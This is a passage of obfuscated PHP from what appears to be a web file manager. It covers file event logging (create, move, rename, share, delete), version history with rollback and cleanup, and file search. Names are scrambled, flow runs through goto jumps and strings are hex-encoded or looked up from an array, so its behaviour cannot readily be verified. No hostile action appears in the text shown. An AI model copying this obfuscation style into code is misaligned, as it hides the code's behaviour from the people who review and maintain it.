$Aê¡ÏõÊ½ˆ[2317] => $C£ƒ‰¨Ğä˜[$Aê¡ÏõÊ½ˆ[472]], $Aê¡ÏõÊ½ˆ[2318] => $C£ƒ‰¨Ğä˜[$Aê¡ÏõÊ½ˆ[38]], $Aê¡ÏõÊ½ˆ[477] => $C£ƒ‰¨Ğä˜[$Aê¡ÏõÊ½ˆ[477]], $Aê¡ÏõÊ½ˆ[1434] => USER_ID, $Aê¡ÏõÊ½ˆ[397] => $d†ì½Â·¬³, $Aê¡ÏõÊ½ˆ[1436] => $a÷ñÔÃ­Ù ); $this->addSystemLog($d†ì½Â·¬³, $Dà‰§¬Ñ“); return $this->add($Dà‰§¬Ñ“); goto föÖÁ—Ü’®; f—¦Ÿ»Ëë: if (!$C£ƒ‰¨Ğä˜) { return !1; } if ($this->isCacheEvent($C£ƒ‰¨Ğä˜, $d†ì½Â·¬³)) { return; } if ($a÷ñÔÃ­Ù  && is_string($a÷ñÔÃ­Ù )) { $a÷ñÔÃ­Ù  = array($Aê¡ÏõÊ½ˆ[2145] => $a÷ñÔÃ­Ù ); } goto BÖóĞÇá¨Í; e£ÄÓÉ©Îª: $Aê¡ÏõÊ½ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->eventSave) { return; } $C£ƒ‰¨Ğä˜ = Model($Aê¡ÏõÊ½ˆ[1124])->sourceInfo($E¶¨ùÙ‹¢Î); goto f—¦Ÿ»Ëë; föÖÁ—Ü’®: } private function addSystemLog($b¬¡Š˜ÊŸ, $FíØƒ”˜Ûõ) { $aø­¦¤êÊà =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($b¬¡Š˜ÊŸ == $aø­¦¤êÊà[2319]) { $b¬¡Š˜ÊŸ = $FíØƒ”˜Ûõ[$aø­¦¤êÊà[414]][$aø­¦¤êÊà[2320]]; } else { if (in_array($b¬¡Š˜ÊŸ, array($aø­¦¤êÊà[2091], $aø­¦¤êÊà[2321]))) { $b¬¡Š˜ÊŸ = $FíØƒ”˜Ûõ[$aø­¦¤êÊà[414]][$aø­¦¤êÊà[701]]; } } $D²Á½ˆÏŸŒ = array_merge($FíØƒ”˜Ûõ, array($aø­¦¤êÊà[2322] => $FíØƒ”˜Ûõ[$aø­¦¤êÊà[378]], $aø­¦¤êÊà[2323] => $FíØƒ”˜Ûõ[$aø­¦¤êÊà[2323]])); Model($aø­¦¤êÊà[2054])->addLog($aø­¦¤êÊà[2324] . $b¬¡Š˜ÊŸ, $D²Á½ˆÏŸŒ); } private function isCacheEvent($cí­ŒÌàÛ‰, $Fó†æ±ééÊ) { if ($cí­ŒÌàÛ‰[$_SERVER[çŞáÓæÚô‚Ô‡][380]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aåÖ±§›¾, $cÃ³ê„Õ¥¶) { $d‚…øÇˆ˜… =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÑæ¤Èò²ø = Model($d‚…øÇˆ˜…[1124])->sourceInfo($aåÖ±§›¾); $B¶¯¶¹Ÿ©à = array($d‚…øÇˆ˜…[2320] => $cÃ³ê„Õ¥¶, $d‚…øÇˆ˜…[38] => $fÑæ¤Èò²ø[$d‚…øÇˆ˜…[38]]); return $this->addEvent($aåÖ±§›¾, $d‚…øÇˆ˜…[2319], $B¶¯¶¹Ÿ©à); } public function eventFileEdit($EÉí‚¸ğô) { $eóìšÄãä† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÜÖ¹¦ƒ = array($eóìšÄãä†[2325] => $_SERVER[$eóìšÄãä†[2326]], $eóìšÄãä†[1758] => strtolower(ACTION)); return $this->addEvent($EÉí‚¸ğô, $eóìšÄãä†[2081], $AÜÖ¹¦ƒ); } public function eventRecycle($DíØ¿ ‘, $dó¨ïµĞ’Ü) { return $this->addEvent($DíØ¿ ‘, $_SERVER[çŞáÓæÚô‚Ô‡][2321], $dó¨ïµĞ’Ü); } public function eventRemove($bß¿¤•‡) { $c¸Ù¦†›ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÃåªÒòç = Model($c¸Ù¦†›ê[1124])->sourceInfo($bß¿¤•‡); $dÒ“£‚”† = $AÃåªÒòç[$c¸Ù¦†›ê[38]]; return $this->addEvent($AÃåªÒòç[$c¸Ù¦†›ê[472]], $c¸Ù¦†›ê[2080], $dÒ“£‚”†); } public function eventShare($eÎ‰óæÕ„•, $FÌ†ïÃ«¸‡) { return $this->addEvent($eÎ‰óæÕ„•, $_SERVER[çŞáÓæÚô‚Ô‡][2091], $FÌ†ïÃ«¸‡); } public function eventMove($eœ±Ñ†¶ßî, $F•Éİš²æ, $A†ÑòùÓÆã) { goto Eî©†×ëÏî; báŠ‘ÕÌÈ: $this->addEvent($eœ±Ñ†¶ßî, $c±Â˜ŠÚ¯[503], $D‹‹ˆ¢Ñîˆ); $EãŞˆÒç„ = $aœÄº³ï®«->sourceInfo($eœ±Ñ†¶ßî); $D‹‹ˆ¢Ñîˆ = array($c±Â˜ŠÚ¯[378] => $EãŞˆÒç„[$c±Â˜ŠÚ¯[378]], $c±Â˜ŠÚ¯[38] => $EãŞˆÒç„[$c±Â˜ŠÚ¯[38]]); goto BËô³†ªáÛ; Eî©†×ëÏî: $c±Â˜ŠÚ¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aœÄº³ï®« = Model($c±Â˜ŠÚ¯[1124]); $EãŞˆÒç„ = $aœÄº³ï®«->sourceInfo($eœ±Ñ†¶ßî); goto Aîê¦ƒŞ; Aîê¦ƒŞ: $d½§Üçœß· = $aœÄº³ï®«->sourceInfo($F•Éİš²æ); $A¡·ÑÀ õÂ = $aœÄº³ï®«->sourceInfo($A†ÑòùÓÆã); $D‹‹ˆ¢Ñîˆ = array($c±Â˜ŠÚ¯[1014] => $F•Éİš²æ, $c±Â˜ŠÚ¯[2327] => $d½§Üçœß·[$c±Â˜ŠÚ¯[38]], $c±Â˜ŠÚ¯[2328] => $d½§Üçœß·[$c±Â˜ŠÚ¯[477]], $c±Â˜ŠÚ¯[1015] => $A†ÑòùÓÆã, $c±Â˜ŠÚ¯[2329] => $A¡·ÑÀ õÂ[$c±Â˜ŠÚ¯[38]], $c±Â˜ŠÚ¯[2330] => $A¡·ÑÀ õÂ[$c±Â˜ŠÚ¯[477]]); goto báŠ‘ÕÌÈ; BËô³†ªáÛ: $this->addEvent($F•Éİš²æ, $c±Â˜ŠÚ¯[2331], $D‹‹ˆ¢Ñîˆ); goto e·¹Úƒ¨³ó; e·¹Úƒ¨³ó: } public function eventCopy($b„¯‹ÌËµø) { $this->eventCreate($b„¯‹ÌËµø, $_SERVER[çŞáÓæÚô‚Ô‡][501]); } public function eventRename($Eˆ «Ş˜åé, $c¤Î×æÜ•, $aÛ·¤ïÜÇÎ) { $Bå°”ã© =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e†ÒËö‚¦– = array($Bå°”ã©[1014] => $c¤Î×æÜ•, $Bå°”ã©[1015] => $aÛ·¤ïÜÇÎ); return $this->addEvent($Eˆ «Ş˜åé, $Bå°”ã©[1137], $e†ÒËö‚¦–); } public function eventAddComment($A˜¾øÎ…ÃŞ, $BˆĞÎÆšó) { return $this->addEvent($A˜¾øÎ…ÃŞ, $_SERVER[çŞáÓæÚô‚Ô‡][2332], $BˆĞÎÆšó); } public function eventAddDesc($DÍ„Ì²Ù¡, $e®ÚÎ™ØğÁ) { return $this->addEvent($DÍ„Ì²Ù¡, $_SERVER[çŞáÓæÚô‚Ô‡][2333], $e®ÚÎ™ØğÁ); } public function listBySource($c¬†ÏÀÄ×î) { goto E·¥‘ØƒÍš; aš•Ğ×–Ğ: if ($A°§‰ƒ‚Í[$dËÈ«èõ§[379]] == $dËÈ«èõ§[93]) { $CĞ×Ã„–Ğí = Model($dËÈ«èõ§[1124])->listSearchChildren($c¬†ÏÀÄ×î, 20000); $CĞ×Ã„–Ğí[] = $c¬†ÏÀÄ×î . $dËÈ«èõ§[370]; $Dä‹Ê¬Ï–½ = array($dËÈ«èõ§[378] => array($dËÈ«èõ§[17], $CĞ×Ã„–Ğí)); } $AÕÜĞ™Š¡‰ = $this->where($Dä‹Ê¬Ï–½)->order($dËÈ«èõ§[2334])->selectPage(); if ($AÕÜĞ™Š¡‰[$dËÈ«èõ§[360]][$dËÈ«èõ§[361]] == 0) { $AÕÜĞ™Š¡‰[$dËÈ«èõ§[360]][$dËÈ«èõ§[361]] = 1; $AÕÜĞ™Š¡‰[$dËÈ«èõ§[363]] = array(array($dËÈ«èõ§[392] => $c¬†ÏÀÄ×î, $dËÈ«èõ§[2317] => $A°§‰ƒ‚Í[$dËÈ«èõ§[472]], $dËÈ«èõ§[1434] => $A°§‰ƒ‚Í[$dËÈ«èõ§[387]], $dËÈ«èõ§[397] => $dËÈ«èõ§[2335], $dËÈ«èõ§[398] => $A°§‰ƒ‚Í[$dËÈ«èõ§[197]], $dËÈ«èõ§[1436] => $dËÈ«èõ§[43])); } goto FçµÃÌË³; E·¥‘ØƒÍš: $dËÈ«èõ§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A°§‰ƒ‚Í = Model($dËÈ«èõ§[1124])->sourceInfo($c¬†ÏÀÄ×î); $Dä‹Ê¬Ï–½ = array($dËÈ«èõ§[392] => $c¬†ÏÀÄ×î); goto aš•Ğ×–Ğ; FçµÃÌË³: return $this->eventListParse($AÕÜĞ™Š¡‰, $c¬†ÏÀÄ×î); goto d¯½È÷ëö£; d¯½È÷ëö£: } private function eventListParse($AÌˆ‘É»Ê¶, $f…¥‰³¬) { goto D¿Ÿóİ¤ñ; b•êÄäº‰°: $cŠöÄÂÊÃ³ = array_to_keyvalue($EçóŞç†Ê¾, $bœ®©„Û–[43], $bœ®©„Û–[2323]); foreach ($EçóŞç†Ê¾ as $e§ŠŠƒŒ£›) { $b¤‚Ì¬¡Õ¼ = $e§ŠŠƒŒ£›[$bœ®©„Û–[414]]; if ($e§ŠŠƒŒ£›[$bœ®©„Û–[39]] == $bœ®©„Û–[503] && isset($b¤‚Ì¬¡Õ¼[$bœ®©„Û–[1014]])) { $E¹ß”¦îâ[] = $b¤‚Ì¬¡Õ¼[$bœ®©„Û–[1014]] . $bœ®©„Û–[43]; $E¹ß”¦îâ[] = $b¤‚Ì¬¡Õ¼[$bœ®©„Û–[1015]] . $bœ®©„Û–[43]; } if ($e§ŠŠƒŒ£›[$bœ®©„Û–[39]] == $bœ®©„Û–[2331] && isset($b¤‚Ì¬¡Õ¼[$bœ®©„Û–[378]])) { $E¹ß”¦îâ[] = $b¤‚Ì¬¡Õ¼[$bœ®©„Û–[378]] . $bœ®©„Û–[43]; } } $E¹ß”¦îâ = array_merge($E¹ß”¦îâ, $cŠöÄÂÊÃ³, array($f…¥‰³¬ . $bœ®©„Û–[43])); goto C­ØÓ”´Øá; C­ØÓ”´Øá: $E¹ß”¦îâ = array_unique($E¹ß”¦îâ); $F‚¶÷ëº³Ñ = array_unique(array_to_keyvalue($EçóŞç†Ê¾, $bœ®©„Û–[43], $bœ®©„Û–[1443])); $fİíŠ­‰ê¾ = Model($bœ®©„Û–[488])->userListInfo($F‚¶÷ëº³Ñ); goto bµ±ÕÌšÕì; bµ±ÕÌšÕì: $Fê¡á¿ò = Model($bœ®©„Û–[761])->sourceListInfo($E¹ß”¦îâ, !0); foreach ($EçóŞç†Ê¾ as &$e§ŠŠƒŒ£›) { if ($e§ŠŠƒŒ£›[$bœ®©„Û–[39]] == $bœ®©„Û–[503] && isset($e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[1014]])) { $e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[1014]] = $Fê¡á¿ò[$e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[1014]]]; $e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[1015]] = $Fê¡á¿ò[$e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[1015]]]; } if ($e§ŠŠƒŒ£›[$bœ®©„Û–[39]] == $bœ®©„Û–[2331] && isset($e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[378]])) { $e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[378]] = $Fê¡á¿ò[$e§ŠŠƒŒ£›[$bœ®©„Û–[414]][$bœ®©„Û–[378]]]; } $e§ŠŠƒŒ£›[$bœ®©„Û–[400]] = $Fê¡á¿ò[$e§ŠŠƒŒ£›[$bœ®©„Û–[378]]]; $e§ŠŠƒŒ£›[$bœ®©„Û–[2336]] = $Fê¡á¿ò[$e§ŠŠƒŒ£›[$bœ®©„Û–[2323]]]; if ($e§ŠŠƒŒ£›[$bœ®©„Û–[39]] == $bœ®©„Û–[2080]) { $e§ŠŠƒŒ£›[$bœ®©„Û–[2336]] = $e§ŠŠƒŒ£›[$bœ®©„Û–[400]]; $e§ŠŠƒŒ£›[$bœ®©„Û–[2323]] = $e§ŠŠƒŒ£›[$bœ®©„Û–[2336]][$bœ®©„Û–[378]]; $e§ŠŠƒŒ£›[$bœ®©„Û–[400]] = !1; $e§ŠŠƒŒ£›[$bœ®©„Û–[378]] = $bœ®©„Û–[43]; } $e§ŠŠƒŒ£›[$bœ®©„Û–[2267]] = $fİíŠ­‰ê¾[$e§ŠŠƒŒ£›[$bœ®©„Û–[1443]]]; } unset($e§ŠŠƒŒ£›); goto e†°‚êÃ‘Ã; e†°‚êÃ‘Ã: $AÌˆ‘É»Ê¶[$bœ®©„Û–[363]] = $EçóŞç†Ê¾; return $AÌˆ‘É»Ê¶; goto Fƒ­î¶ñ˜Ö; D¿Ÿóİ¤ñ: $bœ®©„Û– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EçóŞç†Ê¾ = $AÌˆ‘É»Ê¶[$bœ®©„Û–[363]]; $E¹ß”¦îâ = array_to_keyvalue($EçóŞç†Ê¾, $bœ®©„Û–[43], $bœ®©„Û–[378]); goto b•êÄäº‰°; Fƒ­î¶ñ˜Ö: } public function removeBySource($bØ»Ï±îÊÛ) { $A±™âœóÙ = array($_SERVER[çŞáÓæÚô‚Ô‡][392] => $bØ»Ï±îÊÛ); $this->where($A±™âœóÙ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\143\x65\137\150\151\x73\164\x6f\162\x79"; public function addHistory($bµš†¹«¯, $BîÅáæƒŠ = '') { $E¹†Ìî„º¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dˆÊæÖâ« = array($E¹†Ìî„º¦[392] => $bµš†¹«¯[$E¹†Ìî„º¦[378]], $E¹†Ìî„º¦[1434] => isset($bµš†¹«¯[$E¹†Ìî„º¦[388]]) ? $bµš†¹«¯[$E¹†Ìî„º¦[388]] : $bµš†¹«¯[$E¹†Ìî„º¦[387]], $E¹†Ìî„º¦[429] => $bµš†¹«¯[$E¹†Ìî„º¦[428]], $E¹†Ìî„º¦[531] => $bµš†¹«¯[$E¹†Ìî„º¦[87]], $E¹†Ìî„º¦[2337] => $BîÅáæƒŠ); $B¢õƒ«šã = $GLOBALS[$E¹†Ìî„º¦[16]][$E¹†Ìî„º¦[94]][$E¹†Ìî„º¦[2338]]; if ($B¢õƒ«šã > 1) { $this->historyAutoClear($dˆÊæÖâ«[$E¹†Ìî„º¦[378]]); $this->add($dˆÊæÖâ«); } Model($E¹†Ìî„º¦[2339])->eventFileEdit($bµš†¹«¯[$E¹†Ìî„º¦[378]]); } private function historyAutoClear($b…ÁÁ½†öâ) { goto FëäÒ¡¾ Ñ; C²»Ÿ™…ôÄ: $d‘¿´Ê´Ÿ† = array_to_keyvalue($DÇïõêØË, $b»«ç„ôˆ¼[43], $b»«ç„ôˆ¼[428]); $d‘¿´Ê´Ÿ† = array_slice($d‘¿´Ê´Ÿ†, $D‰»èß¨Ãê); if (!$EËœÂ”¼âÛ || !$d‘¿´Ê´Ÿ†) { return; } goto A¼¨šœÜ©; f‡Ãöƒ¡´®: if (!$DÇïõêØË || $D‰»èß¨Ãê >= count($DÇïõêØË)) { return; } $EËœÂ”¼âÛ = array_to_keyvalue($DÇïõêØË, $b»«ç„ôˆ¼[43], $b»«ç„ôˆ¼[376]); $EËœÂ”¼âÛ = array_slice($EËœÂ”¼âÛ, $D‰»èß¨Ãê); goto C²»Ÿ™…ôÄ; A¼¨šœÜ©: $aòƒÛ£ˆÜ† = array($b»«ç„ôˆ¼[394] => array($b»«ç„ôˆ¼[17], $EËœÂ”¼âÛ)); $this->where($aòƒÛ£ˆÜ†)->delete(); Model($b»«ç„ôˆ¼[431])->remove($d‘¿´Ê´Ÿ†); goto c™ÛÀºÏ†Õ; E°•”¿šÔ: if ($D‰»èß¨Ãê >= 500) { return; } $aòƒÛ£ˆÜ† = array($b»«ç„ôˆ¼[392] => $b…ÁÁ½†öâ); $DÇïõêØË = $this->field($b»«ç„ôˆ¼[2342])->where($aòƒÛ£ˆÜ†)->order($b»«ç„ôˆ¼[2334])->select(); goto f‡Ãöƒ¡´®; FëäÒ¡¾ Ñ: $b»«ç„ôˆ¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C¬Û³ƒ­İŞ = Model($b»«ç„ôˆ¼[1095])->get($b»«ç„ôˆ¼[2340]); $Eï¡ÃªŞà = $GLOBALS[$b»«ç„ôˆ¼[16]][$b»«ç„ôˆ¼[94]][$b»«ç„ôˆ¼[2338]]; goto Eº·ÏÖÛ; Eº·ÏÖÛ: $c÷‘ğÌ—· = $C¬Û³ƒ­İŞ == $b»«ç„ôˆ¼[2341] ? 3 : $Eï¡ÃªŞà; if ($Eï¡ÃªŞà <= 1) { $c÷‘ğÌ—· = 1; } $D‰»èß¨Ãê = $c÷‘ğÌ—· - 1; goto E°•”¿šÔ; c™ÛÀºÏ†Õ: } public function listData($ağë›Ï©) { goto DÃ¿èÍ·ƒ; D÷¬ÖÙäô¼: $FƒùØ–Ùƒí = $this->field($B¥¦µ…é)->where($E› Ö÷…­É)->order($e¼Ó×¡ùá[2334])->selectPage(); $this->_listAppendUser($FƒùØ–Ùƒí[$e¼Ó×¡ùá[363]]); $CºÖ…ˆÊ×Î = Model($e¼Ó×¡ùá[1095])->get($e¼Ó×¡ùá[2340]); goto a‹Ş¶ÕÃ¥Š; DÃ¿èÍ·ƒ: $e¼Ó×¡ùá =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E› Ö÷…­É = array($e¼Ó×¡ùá[392] => $ağë›Ï©); $B¥¦µ…é = $e¼Ó×¡ùá[2343]; goto D÷¬ÖÙäô¼; a‹Ş¶ÕÃ¥Š: $f’Â©ÒÌÜº = 3; if ($CºÖ…ˆÊ×Î == $e¼Ó×¡ùá[2341]) { $FƒùØ–Ùƒí[$e¼Ó×¡ùá[363]] = array_slice($FƒùØ–Ùƒí[$e¼Ó×¡ùá[363]], 0, $f’Â©ÒÌÜº); $FƒùØ–Ùƒí[$e¼Ó×¡ùá[360]] = array($e¼Ó×¡ùá[2344] => 1, $e¼Ó×¡ùá[2345] => 20, $e¼Ó×¡ùá[2346] => 1, $e¼Ó×¡ùá[2347] => count($FƒùØ–Ùƒí[$e¼Ó×¡ùá[363]])); } return $FƒùØ–Ùƒí; goto A”Ú§Œ‚ÜÏ; A”Ú§Œ‚ÜÏ: } protected function _listAppendUser(&$dŒºƒÌ¡ˆÔ) { $bêŒ·ï° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÕÕÏ¸ØÙ = array_to_keyvalue($dŒºƒÌ¡ˆÔ, $bêŒ·ï°[43], $bêŒ·ï°[1443]); $A¾Î‹·ç£ = Model($bêŒ·ï°[488])->userListInfo($fÕÕÏ¸ØÙ); foreach ($dŒºƒÌ¡ˆÔ as &$DŞù¯•ãÌ…) { $aºÆ×ìĞ † = $DŞù¯•ãÌ…[$bêŒ·ï°[1443]]; $DŞù¯•ãÌ…[$bêŒ·ï°[387]] = $A¾Î‹·ç£[$aºÆ×ìĞ †] ? $A¾Î‹·ç£[$aºÆ×ìĞ †] : !1; } unset($DŞù¯•ãÌ…); } public function fileInfo($Aõ²Æ¿Ã‰¯) { $d­æ’Ò¤º =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¤İù×¶Ò– = $this->tablePrefix; $E—Õééœí = "{$D¤İù×¶Ò–}\x69\157\137\x66\151\x6c\145\x20\146\x69\154\x65\163\x20\157\156\40\x66\151\x6c\145\163\x2e\x66\151\154\x65\111\x44\x20\75\x20\x68\x69\163\164\157\x72\x79\56\x66\151\x6c\x65\x49\x44"; return $this->alias($d­æ’Ò¤º[2348])->where(array($d­æ’Ò¤º[394] => $Aõ²Æ¿Ã‰¯))->join($E—Õééœí, $d­æ’Ò¤º[2349])->find(); } public function removeItem($eÍ»¤‹ãÉ÷) { $b“ÕÊ¶Û÷İ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¢Ò†Û¹š = array($b“ÕÊ¶Û÷İ[394] => $eÍ»¤‹ãÉ÷); $f¾ƒãê’Æ = $this->where($E¢Ò†Û¹š)->find(); if ($f¾ƒãê’Æ) { $A»Í¼»À…½ = $this->where($E¢Ò†Û¹š)->delete(); Model($b“ÕÊ¶Û÷İ[431])->remove($f¾ƒãê’Æ[$b“ÕÊ¶Û÷İ[428]]); return $A»Í¼»À…½; } return !1; } public function removeBySource($f“ñì©¦Öó) { goto c™“ÎàÀö; c™“ÎàÀö: $D›˜±ñä·á =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$f“ñì©¦Öó) { return !1; } if (!is_array($f“ñì©¦Öó)) { $f“ñì©¦Öó = array($f“ñì©¦Öó); } goto cØ»“ëÁŞ¤; c¼½Â…¢·Û: return !0; goto cåæìÓø‰ì; cØ»“ëÁŞ¤: $d±ùÈ‡§®É = array($D›˜±ñä·á[392] => array($D›˜±ñä·á[17], $f“ñì©¦Öó)); $BÂ×ÈºØ¦İ = $this->field($D›˜±ñä·á[429])->where($d±ùÈ‡§®É)->select(); if ($BÂ×ÈºØ¦İ) { $this->where($d±ùÈ‡§®É)->delete(); $D•ÌÕÆ¤´Æ = array_to_keyvalue($BÂ×ÈºØ¦İ, $D›˜±ñä·á[43], $D›˜±ñä·á[428]); Model($D›˜±ñä·á[431])->remove($D•ÌÕÆ¤´Æ); } goto c¼½Â…¢·Û; cåæìÓø‰ì: } public function setDetail($eÀ¢§É…ª, $dêÓŒ¶í¸®) { $E‹±ƒ‘îÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return $this->where(array($E‹±ƒ‘îÂ[394] => $eÀ¢§É…ª))->save(array($E‹±ƒ‘îÂ[2337] => $dêÓŒ¶í¸®)); } public function rollbackToItem($a§¡ƒ†µÆÎ, $Dİ¼æ›‡‹) { goto fòôÎÊĞŒ; dìøŸ¥°Ìâ: $AÓ©£‹ğŒÔ = $this->find($Dİ¼æ›‡‹); $BˆÍöÉƒ“– = array($b¥öõêÛÓà[428] => $AÓ©£‹ğŒÔ[$b¥öõêÛÓà[428]], $b¥öõêÛÓà[87] => $AÓ©£‹ğŒÔ[$b¥öõêÛÓà[87]], $b¥öõêÛÓà[117] => time(), $b¥öõêÛÓà[388] => USER_ID); Model($b¥öõêÛÓà[761])->where(array($b¥öõêÛÓà[378] => $a§¡ƒ†µÆÎ))->save($BˆÍöÉƒ“–); goto f¡…¹’¼Ğ¼; f¡…¹’¼Ğ¼: return $this->where(array($b¥öõêÛÓà[394] => $Dİ¼æ›‡‹))->delete(); goto B»ñ®ŞÒÃ; fòôÎÊĞŒ: $b¥öõêÛÓà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b««¶‰®Ÿ½ = Model($b¥öõêÛÓà[761])->sourceInfo($a§¡ƒ†µÆÎ); $this->addHistory($b««¶‰®Ÿ½); goto dìøŸ¥°Ìâ; B»ñ®ŞÒÃ: } public function clearSame($cµ˜„ßÕ“) { goto E…ª§ôğ¨Ì; E…ª§ôğ¨Ì: $c¶÷ÔÕ„ĞÓ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aå»‰ø¯Œ = $this->listData($cµ˜„ßÕ“); $B¤Ô‹ƒŒš„ = array_to_keyvalue_group($aå»‰ø¯Œ, $c¶÷ÔÕ„ĞÓ[428]); goto BíÉ“ë„ŞÖ; B‡­¢¯¹ËÎ: if (!$f®ÊÕÕ³¾ó) { return; } $this->where(array($c¶÷ÔÕ„ĞÓ[376] => array($c¶÷ÔÕ„ĞÓ[17], $f®ÊÕÕ³¾ó)))->delete(); Model($c¶÷ÔÕ„ĞÓ[431])->remove($cğÓ¼ÇÁóÈ); goto aàäÍêÕ¯â; BíÉ“ë„ŞÖ: $cğÓ¼ÇÁóÈ = array(); $f®ÊÕÕ³¾ó = array(); foreach ($B¤Ô‹ƒŒš„ as $cİßÏ¹®ô«) { if (!$cİßÏ¹®ô« || count($cİßÏ¹®ô«) <= 1) { continue; } foreach ($cİßÏ¹®ô« as $Eë¤çƒªë§) { $cğÓ¼ÇÁóÈ[] = $Eë¤çƒªë§[$c¶÷ÔÕ„ĞÓ[428]]; $f®ÊÕÕ³¾ó[] = $Eë¤çƒªë§[$c¶÷ÔÕ„ĞÓ[376]]; } } goto B‡­¢¯¹ËÎ; aàäÍêÕ¯â: } public function userSpace() { $aÂØ„Ğ­” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C ­ñˆ‘Şà = $this->tablePrefix; $b¹óÃ¸¾ßŸ = array($aÂØ„Ğ­”[1434] => USER_ID); $Cœƒ…‹ê‰ = "{$C ­ñˆ‘Şà}\151\x6f\x5f\x66\151\154\x65\x20\x66\151\x6c\145\x73\x20\x6f\156\x20\146\x69\x6c\x65\163\56\146\151\154\145\111\104\40\75\x20\150\x69\163\x74\157\x72\171\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($aÂØ„Ğ­”[2348])->where($b¹óÃ¸¾ßŸ)->join($Cœƒ…‹ê‰, $aÂØ„Ğ­”[2349])->sum($aÂØ„Ğ­”[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($AºÙ•©Â§´) { goto BïÀÇ¿ƒÛÄ; c„†õàŸğæ: if (!$D¦Ï›Ö©ß®) { return array(); } $bòƒæö‘Ñ = $D¦Ï›Ö©ß®[$F’Ú·ÚÙÑå[170]]; $E§ËôÓê«† = $F’Ú·ÚÙÑå[17]; goto b“£Óéƒ•Ü; b“£Óéƒ•Ü: if (!$D¦Ï›Ö©ß®[$F’Ú·ÚÙÑå[170]]) { $C½ËÅ§öÊò = array_to_keyvalue($b¸Š‰æŒíÄ, $F’Ú·ÚÙÑå[43], $F’Ú·ÚÙÑå[170]); $bòƒæö‘Ñ = implode($F’Ú·ÚÙÑå[57], $C½ËÅ§öÊò); $E§ËôÓê«† = $F’Ú·ÚÙÑå[2297]; } $e“º£‰©‡¹ = explode($F’Ú·ÚÙÑå[57], trim($bòƒæö‘Ñ, $F’Ú·ÚÙÑå[57])); return array($E§ËôÓê«†, $e“º£‰©‡¹); goto fˆ÷İ“‘½; BïÀÇ¿ƒÛÄ: $F’Ú·ÚÙÑå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¸Š‰æŒíÄ = KodIO::fileTypeList(); $D¦Ï›Ö©ß® = $b¸Š‰æŒíÄ[$AºÙ•©Â§´]; goto c„†õàŸğæ; fˆ÷İ“‘½: } public function listPathType($C›ˆ§ÄĞ‘£) { $EïºÂÎ‰ˆä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eè˜ÁÙ…Ã = $this->fileTypeWhere($C›ˆ§ÄĞ‘£); if (!$eè˜ÁÙ…Ã) { return array(); } $c¦§Â÷ÕÁ· = array($EïºÂÎ‰ˆä[532] => SourceModel::TYPE_USER, $EïºÂÎ‰ˆä[533] => USER_ID, $EïºÂÎ‰ˆä[529] => 0, $EïºÂÎ‰ˆä[530] => $eè˜ÁÙ…Ã); return $this->listSource($c¦§Â÷ÕÁ·); } public function listSearch($dßÊ‘Ò¿‚›, $DÊ´¶“øÎ = 300) { goto DôÕßÙÍ·; DôÕßÙÍ·: $a÷•î„²ê§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($dßÊ‘Ò¿‚›[$a÷•î„²ê§[2195]]) && $dßÊ‘Ò¿‚›[$a÷•î„²ê§[2195]]) { $dßÊ‘Ò¿‚›[$a÷•î„²ê§[2195]] = str_replace($a÷•î„²ê§[1599], $a÷•î„²ê§[2350], trim($dßÊ‘Ò¿‚›[$a÷•î„²ê§[2195]])); } $d´¡–à¡ë© = $this->_parseSearchWhere($dßÊ‘Ò¿‚›); goto f¶¬½¶®; f¶¬½¶®: if (!isset($d´¡–à¡ë©[$a÷•î„²ê§[406]])) { $d´¡–à¡ë©[$a÷•î„²ê§[406]] = 0; } $a÷ãõ¼ê = $a÷•î„²ê§[2351]; $fã­…¾âÚ® = $a÷ãõ¼ê; goto D°Ó¹©Šï‚; D°Ó¹©Šï‚: $this->_listSearchBindPinyin($dßÊ‘Ò¿‚›, $d´¡–à¡ë©, $a÷ãõ¼ê); $this->alias($a÷•î„²ê§[498])->_makeOrder(); $F´Áß”ƒáƒ = $this->distinct(!0)->field($a÷ãõ¼ê)->where($d´¡–à¡ë©)->selectPage($DÊ´¶“øÎ); goto dË°™ÄœÏ«; c®ğÇÅ°Å: $this->_listDataApply($F´Áß”ƒáƒ[$a÷•î„²ê§[363]]); $this->_listMake($F´Áß”ƒáƒ); return $F´Áß”ƒáƒ; goto e Ù£æÁ÷¦; dË°™ÄœÏ«: $this->_listSearchDesc($F´Áß”ƒáƒ, $dßÊ‘Ò¿‚›, $fã­…¾âÚ®); $this->_listSearchTag($F´Áß”ƒáƒ, $dßÊ‘Ò¿‚›, $fã­…¾âÚ®); 